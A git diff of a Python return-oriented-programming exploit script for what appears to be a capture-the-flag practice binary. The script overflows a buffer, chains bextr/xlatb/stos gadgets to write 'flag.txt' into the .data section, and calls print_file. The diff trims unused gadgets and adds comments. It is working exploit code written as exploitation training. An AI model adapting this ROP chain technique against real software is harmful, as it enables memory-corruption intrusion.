@@ -9,10 +9,6 @@ leetcoff = struct.pack("L", 0x13371337c000ffee)
 
 print_file = struct.pack("L", 0x400510)
 
-# alternatively r8b -> al
-add_rax_r8b = struct.pack("L", 0x4005ed) # add byte [rax], r8b; repz ret
-add_rcx_al_pop_rbp = struct.pack("L", 0x4005e7) # add byte [rcx], al; pop rbp; ret
-
 # 0x40062a pop rdx
 # 0x40062b pop rcx
 # 0x40062c add rcx, 0x3ef2
@@ -20,15 +16,12 @@ add_rcx_al_pop_rbp = struct.pack("L", 0x4005e7) # add byte [rcx], al; pop rbp; r
 # 0x400638 ret
 bextr_gad = struct.pack("L", 0x40062a)
 
-# sets al to byte at [rbx] 
+# sets al to byte at [rbx+al] 
 xlatb = struct.pack("L", 0x400628) # xlat BYTE PTR ds:[rbx]; ret
 
 # stores content of al to [rdi]
 stos = struct.pack("L", 0x400639) #stos BYTE PTR es:[rdi], al
 
-#! this one can also lead to pop rsi, rdi, rbp and rsp
-pop_r12_15 = struct.pack("L", 0x40069c) # pop r12; ... ; pop r15; ret
-pop_rbp = struct.pack("L", 0x400615) # pop rbp; ret
 pop_rdi = struct.pack("L", 0x4006a3) # pop rdi; ret
 
 def copy_byte(destination: int, source: int):
@@ -47,9 +40,10 @@ filename_loc_raw = 0x601028 #.data
 filename = b"flag.txt"
 
 payload = b'A'*padding_len
-payload += leetcoff
+payload += leetcoff # rbp overwrite
 
 # this *could* be automated even further but I'm satisfied in this case
+# source subtracts are here to compensate the annoying +al in [rdi+al]
 payload += copy_byte(filename_loc_raw,   0x4003c4-ord('\x0b')) # f 
 payload += copy_byte(filename_loc_raw+1, 0x400239-ord('f')) # l
 payload += copy_byte(filename_loc_raw+2, 0x4003d6-ord('l')) # a
@@ -58,7 +52,6 @@ payload += copy_byte(filename_loc_raw+4, 0x40024e-ord('g')) # .
 payload += copy_byte(filename_loc_raw+5, 0x400192-ord('.')) # t
 payload += copy_byte(filename_loc_raw+6, 0x400246-ord('t')) # x
 payload += copy_byte(filename_loc_raw+7, 0x400192-ord('x')) # t
-#payload += copy_byte(filename_loc_raw+8, 0x4003cc-ord('t')) # \0
 
 payload += pop_rdi
 payload += struct.pack("L", filename_loc_raw)
